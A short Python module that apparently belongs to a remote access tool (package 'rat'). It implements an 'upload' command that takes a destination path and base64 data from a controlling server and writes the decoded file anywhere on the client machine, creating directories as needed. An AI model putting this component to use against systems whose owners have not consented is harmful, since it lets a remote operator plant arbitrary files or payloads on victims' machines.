from pathlib import Path
import base64
from rat.commands.base_command import BaseCommand


class UploadCommand(BaseCommand):

    name = "upload"
    description = "Receive file from server and save it"

    def execute(self, args: str) -> str:
        try:
            # Split only once on the first newline
            if "\n" not in args:
                return "UPLOAD\nERROR\nInvalid format (missing newline)\nEOF"

            dst_path_str, encoded = args.split("\n", 1)
            dst_path = Path(dst_path_str.strip())
            encoded = encoded.strip()  # Remove any accidental whitespace around base64

            data = base64.b64decode(encoded)
            dst_path.parent.mkdir(parents=True, exist_ok=True)
            with open(dst_path, "wb") as f:
                f.write(data)
            return "UPLOAD\nOK\nEOF"
        except Exception as e:
            return f"UPLOAD\nERROR\n{e}\nEOF"